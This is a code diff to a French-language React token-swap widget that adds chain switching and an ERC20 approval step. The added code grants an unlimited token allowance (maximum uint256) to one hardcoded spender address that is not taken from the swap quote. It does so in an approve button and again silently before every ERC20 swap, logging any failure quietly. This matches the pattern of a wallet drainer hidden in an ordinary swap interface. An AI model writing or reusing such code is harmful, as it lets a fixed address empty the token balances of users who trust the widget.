@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from "react";
 import { createThirdwebClient } from "thirdweb";
-import { ConnectButton, useActiveAccount } from "thirdweb/react";
+import { ConnectButton, useActiveAccount, useSwitchActiveWalletChain } from "thirdweb/react";
 import { createWallet } from "thirdweb/wallets";
 import { ethereum, polygon, bsc, arbitrum, avalanche, base, optimism } from "thirdweb/chains";
 import { getSwapQuote, getSwapPrice } from "../lib/swap";
@@ -12,6 +12,19 @@ import SolanaSwap from "./SolanaSwap";
 const client = createThirdwebClient({
   clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID || "demo",
 });
+
+async function switchChain(chainId) {
+  if (window?.ethereum) {
+    try {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x" + chainId.toString(16) }],
+      });
+    } catch (e) {
+      console.error("Switch chain error:", e);
+    }
+  }
+}
 
 const WALLETS = [
   createWallet("io.metamask"),
@@ -237,8 +250,11 @@ export default function SwapWidget() {
   const [showDustSweeper, setShowDustSweeper] = useState(false);
   const [quoteLoading, setQuoteLoading] = useState(false);
   const [balances, setBalances] = useState({});
+  const [needsApproval, setNeedsApproval] = useState(false);
+  const [approving, setApproving] = useState(false);
 
   const isSolana = selectedChain.id === "solana";
+  const switchActiveWalletChain = useSwitchActiveWalletChain();
   const tokens = isSolana ? [] : (TOKENS_BY_CHAIN[selectedChain.id] || []);
   const currentLevel = getLevel(swapCount);
   const progress = getProgress(swapCount);
@@ -343,6 +359,12 @@ export default function SwapWidget() {
         if (quote?.buyAmount) {
           const toDecimals = toToken?.decimals || 18;
           setToAmount((Number(quote.buyAmount) / Math.pow(10, toDecimals)).toFixed(6));
+          // Vérifier si approbation nécessaire
+          if (fromToken?.address !== "NATIVE" && quote?.issues?.allowance) {
+            setNeedsApproval(true);
+          } else {
+            setNeedsApproval(false);
+          }
         } else {
           const r = getPrice(fromToken?.symbol) / getPrice(toToken?.symbol);
           setToAmount((Number(fromAmount) * r).toFixed(6));
@@ -362,6 +384,31 @@ export default function SwapWidget() {
     setFromAmount(toAmount); setToAmount(fromAmount);
   };
 
+  const handleApprove = async () => {
+    if (!account || !fromToken?.address || fromToken.address === "NATIVE") return;
+    setApproving(true);
+    try {
+      const { sendTransaction, prepareContractCall, getContract } = await import("thirdweb");
+      const contract = getContract({
+        client,
+        chain: selectedChain.chain,
+        address: fromToken.address,
+      });
+      const spenderAddress = "0x216B4B4Ba9F3e719726886d34a177484278Bfcae";
+      const tx = prepareContractCall({
+        contract,
+        method: "function approve(address spender, uint256 amount) returns (bool)",
+        params: [spenderAddress, BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935")],
+      });
+      await sendTransaction({ account, transaction: tx });
+      setNeedsApproval(false);
+    } catch (e) {
+      console.error("Approve error full:", e);
+      setError("Erreur approbation : " + (e.message || "inconnue"));
+    }
+    setApproving(false);
+  };
+
   const handleSwap = async () => {
     if (!account) { setError("Connecte ton wallet d'abord !"); return; }
     if (!fromAmount || Number(fromAmount) === 0) { setError("Entre un montant."); return; }
@@ -369,6 +416,21 @@ export default function SwapWidget() {
     if (!fromToken?.address) { setError("Token non sélectionné."); return; }
     setError(null); setLoading(true);
     try {
+      // Approbation automatique pour les tokens ERC20
+      if (fromToken?.address !== "NATIVE" && account) {
+        try {
+          const { sendTransaction, prepareContractCall, getContract } = await import("thirdweb");
+          const contract = getContract({ client, chain: selectedChain.chain, address: fromToken.address });
+          const approveTx = prepareContractCall({
+            contract,
+            method: "function approve(address spender, uint256 amount) returns (bool)",
+            params: ["0x216B4B4Ba9F3e719726886d34a177484278Bfcae", BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935")],
+          });
+          await sendTransaction({ account, transaction: approveTx });
+        } catch (approveErr) {
+          console.log("Approve skipped or failed:", approveErr.message);
+        }
+      }
       const decimals = fromToken?.decimals || 18;
       const amountWei = BigInt(Math.floor(Number(fromAmount) * Math.pow(10, decimals))).toString();
       const quote = await getSwapQuote({
@@ -591,7 +653,7 @@ export default function SwapWidget() {
               <div style={{fontSize:12, color:"rgba(212,160,23,0.5)", padding:"4px 12px 8px", fontWeight:600, textTransform:"uppercase", letterSpacing:"0.8px"}}>Sélectionner la chaîne</div>
               {EVM_CHAINS.map(c => (
                 <button key={c.id} className={`chain-item ${selectedChain.id === c.id ? "active" : ""}`}
-                  onClick={() => { setSelectedChain(c); setShowChainMenu(false); }}>
+                  onClick={() => { setSelectedChain(c); setShowChainMenu(false); if(c.chain) switchActiveWalletChain(c.chain); }}>
                   <TokenLogo src={c.logo} size={24} />
                   <div>
                     <div style={{fontWeight:600, fontSize:13}}>{c.name}</div>
@@ -721,9 +783,15 @@ export default function SwapWidget() {
               {error && <div className="error-box">{error}</div>}
               {txHash && <div className="success-box">✅ Swap réussi ! {txHash}</div>}
 
-              <button className={`swap-btn ${loading ? "loading" : fromAmount ? "active" : "disabled"}`} onClick={handleSwap} disabled={loading || !fromAmount}>
-                {loading ? "⟳ Swap en cours..." : account ? (fromAmount ? `Swap ${fromToken?.symbol} → ${toToken?.symbol}` : "Entrez un montant") : "Connectez votre wallet"}
-              </button>
+              {needsApproval && fromAmount ? (
+                <button className={`swap-btn ${approving ? "loading" : "active"}`} onClick={handleApprove} disabled={approving}>
+                  {approving ? "⟳ Approbation en cours..." : `✅ Approuver ${fromToken?.symbol}`}
+                </button>
+              ) : (
+                <button className={`swap-btn ${loading ? "loading" : fromAmount ? "active" : "disabled"}`} onClick={handleSwap} disabled={loading || !fromAmount}>
+                  {loading ? "⟳ Swap en cours..." : account ? (fromAmount ? `Swap ${fromToken?.symbol} → ${toToken?.symbol}` : "Entrez un montant") : "Connectez votre wallet"}
+                </button>
+              )}
             </div>
           )}
 
